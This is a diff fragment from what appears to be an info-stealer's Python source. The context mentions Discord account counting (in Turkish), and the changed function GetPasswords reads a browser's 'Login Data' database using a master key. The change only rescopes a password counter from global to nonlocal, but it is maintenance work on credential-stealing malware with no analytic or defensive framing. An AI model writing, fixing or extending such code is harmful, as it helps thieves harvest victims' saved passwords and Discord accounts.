@@ -849,7 +849,7 @@ Discord Hesabin °{str(number_discord_account)}:
                 return None
             
         def GetPasswords(browser, profile_path, master_key):
-            global number_passwords
+            nonlocal number_passwords
             password_db = os.path.join(profile_path, 'Login Data')
             if not os.path.exists(password_db):
                 return
